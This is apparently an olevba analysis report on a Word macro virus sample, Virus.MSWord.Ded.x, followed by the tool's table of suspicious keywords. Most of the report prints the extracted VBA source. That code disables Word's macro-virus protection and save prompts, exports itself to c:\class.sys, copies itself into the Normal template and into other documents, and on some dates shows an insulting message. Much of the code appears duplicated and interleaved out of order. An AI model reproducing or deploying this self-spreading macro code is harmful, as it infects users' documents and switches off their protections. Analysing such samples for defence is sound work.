olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.x-f7e3de9ba9cec42e09c74c2b72b20a8cf4291aa6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.x-f7e3de9ba9cec42e09c74c2b72b20a8cf4291aa6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen1()
Sub AutoClose1()
On Error GoTo out
On Error GoTo out
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
Options.ConfirmConversions = False
If nt > 70 And ad > 0 Then GoTo out
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
If nt < 70 Then
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
If nt > 70 And ad > 0 Then GoTo out
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
End If
If nt < 70 Then
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
host.codemodule.AddFromFile ("c:\class.sys")
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
With host.codemodule
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
    For x = 1 To 4
    .deletelines 1
End If
    Next x
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
End With
If nt < 70 Then
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
    With host.codemodule
host.codemodule.AddFromFile ("c:\class.sys")
    .replaceline 1, "Sub AutoClose()"
    .replaceline 71, "Sub ToolsMacro()"
With host.codemodule
    End With
    For x = 1 To 4
End If
With host.codemodule
    .deletelines 1
    For x = 2 To 72 Step 2
    Next x
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
    Next x
End With
End With
If nt < 70 Then
out:
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    With host.codemodule
End Sub
    .replaceline 1, "Sub AutoClose()"
Sub ViewVBCode1()
End Sub
    .replaceline 71, "Sub ToolsMacro()"
    End With
End If
With host.codemodule
    For x = 2 To 72 Step 2
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
    Next x
End With
out:
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub ToolsMacro1()
End Sub
Private Sub Document_Close()
On Error GoTo skam
Options.VirusProtection = False
SWLABS99
skam:
End Sub
Private Sub SWLABS99()
If Not ActiveDocument.VBProject.VBComponents(1).codemodule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To NormalTemplate.VBProject.VBComponents(1).codemodule.CountOfLines
        d = NormalTemplate.VBProject.VBComponents(1).codemodule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).codemodule.Lines(i, 1)
            Wend
            ActiveDocument.VBProject.VBComponents(1).codemodule.InsertLines i * 2, d
        End If
    Next i
    ActiveDocument.SaveAs AddToRecentFiles:=False
Else
If Not NormalTemplate.VBProject.VBComponents(1).codemodule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To ActiveDocument.VBProject.VBComponents(1).codemodule.CountOfLines
        d = ActiveDocument.VBProject.VBComponents(1).codemodule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).codemodule.Lines(i, 1)
            Wend
            NormalTemplate.VBProject.VBComponents(1).codemodule.InsertLines i * 2, d
        End If
    Next i
    NormalTemplate.Save
End If
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

